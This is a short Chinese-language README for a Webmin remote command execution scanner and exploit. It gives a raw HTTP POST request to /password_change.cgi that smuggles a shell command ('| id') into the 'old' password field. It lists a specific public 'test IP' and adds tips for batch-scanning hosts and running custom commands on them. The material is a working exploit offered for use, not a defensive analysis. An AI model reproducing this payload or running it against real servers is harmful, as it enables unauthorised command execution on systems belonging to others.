## Webmin RCE检测和利用

测试IP:https://12.230.227.29:443/

payload

```python
POST /password_change.cgi HTTP/1.1
Host: xxx:port
Referer: http://xxx:port/sesss.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=cnmb&pam=&expired=2&old=test | id&new1=test2&new2=test2
```

参数如下：

![](https://s2.ax1x.com/2019/08/20/m8rgXQ.png)



检测如下

![](https://s2.ax1x.com/2019/08/20/m8r71U.png)



执行自定义命令

![](https://s2.ax1x.com/2019/08/20/m8rbX4.png)



一些需要注意的问题

* 批量检测完之后会保存为save.txt,或许你会直接调用批量执行命令的参数。在那之前先把save.txt里的passwrod_change.cgi给删掉

* 执行自定义命令的时候有时第一次可能会遇见超时，在执行一次即可回显

  第二个问题例子:

  ![](https://s2.ax1x.com/2019/08/20/m8rzh6.png)

  